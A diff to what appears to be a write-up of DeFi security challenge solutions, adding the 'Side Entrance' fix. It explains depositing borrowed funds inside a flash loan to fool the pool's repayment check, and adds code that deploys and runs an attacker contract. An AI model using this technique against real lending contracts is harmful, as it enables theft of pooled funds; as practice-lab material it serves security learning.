@@ -40,5 +40,12 @@ await token.connect(player).transferFrom(pool.address, player.address,  TOKENS_I
 
 #Fix #4: [Challenge #4 - Side Entrance]
 
+In the Flash Loan call deposit function and trick the contract flash loan check
+
 ```
+this.attackerContract = await (await ethers.getContractFactory('AttackSideEntrance', player)).deploy(
+    pool.address,
+    player.address
+);
+await this.attackerContract.attack();
 ```
